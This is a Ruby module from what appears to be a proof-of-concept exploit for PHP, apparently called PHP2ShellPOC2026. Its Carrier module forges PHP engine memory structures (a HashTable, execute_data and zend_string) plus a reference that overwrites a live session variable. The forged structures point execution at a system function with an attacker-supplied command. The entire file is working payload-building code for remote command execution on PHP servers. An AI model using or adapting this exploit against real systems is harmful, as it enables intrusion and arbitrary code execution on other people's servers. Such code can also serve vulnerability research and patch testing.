# frozen_string_literal: true

module PHP2ShellPOC2026
  module Poc
    # Builds the two byte structures the final multipart request carries:
    # a forged HashTable/execute_data/zend_string carrier and the reference
    # that overwrites the live session variable. The offsets inside these
    # structures are part of the exploit protocol; the surrounding Ruby is
    # just packing and byte assignment.
    module Carrier
      TABLE_SIZE = 167
      REFERENCE_SIZE = 55
      COMMAND_OFFSET = 0x98
      EXECUTE_DATA = 0x20
      MAX_COMMAND = 14

      module_function

      def build(carrier_address, system_function, command)
        command = command.to_s.b
        if command.bytesize > MAX_COMMAND
          raise Error, "command is #{command.bytesize} bytes; the carrier allows at most #{MAX_COMMAND}"
        end

        table = ("\x00" * TABLE_SIZE).b
        reference = ("X" * REFERENCE_SIZE).b

        write_u32(table, 0x00, 1, 7)
        write_u32(table, 0x08, 0x10, 0xFFFFFFF8)
        write_u64(table, 0x10, carrier_address + 0x20)
        write_u32(table, 0x18, 1, 1)
        write_u32(table, 0x20, 8, 0)
        write_u64(table, 0x28, 0)
        write_u64(table, 0x30, system_function)

        write_u64(table, EXECUTE_DATA + 0x00, 0)
        write_u64(table, EXECUTE_DATA + 0x08, 0)
        write_u64(table, EXECUTE_DATA + 0x10, system_function)
        write_u64(table, EXECUTE_DATA + 0x18, 0)
        write_u64(table, EXECUTE_DATA + 0x20, 0)
        write_u32(table, EXECUTE_DATA + 0x28, 0)
        write_u32(table, EXECUTE_DATA + 0x2C, 1)
        write_u64(table, EXECUTE_DATA + 0x30, 0)
        write_u64(table, EXECUTE_DATA + 0x38, 0)
        write_u32(table, EXECUTE_DATA + 0x40, 0)
        write_u64(table, EXECUTE_DATA + 0x50, carrier_address + 0x80)
        write_u32(table, EXECUTE_DATA + 0x58, 6)

        write_u32(table, 0x80, 1, 0x106)
        write_u64(table, 0x88, 0)
        write_u64(table, 0x90, command.bytesize)
        table[COMMAND_OFFSET, command.bytesize] = command
        table[COMMAND_OFFSET + command.bytesize] = "\x00"

        write_u32(reference, 0x10, 1, 10)
        write_u64(reference, 0x18, carrier_address)
        write_u64(reference, 0x20, 0x307)
        write_u64(reference, 0x28, 0)

        [table, reference]
      end

      def write_u32(buffer, offset, *values)
        values.each_with_index do |value, index|
          buffer[offset + (index * 4), 4] = [value].pack("V")
        end
      end
      private_class_method :write_u32

      def write_u64(buffer, offset, value)
        buffer[offset, 8] = [value].pack("Q<")
      end
      private_class_method :write_u64
    end
  end
end
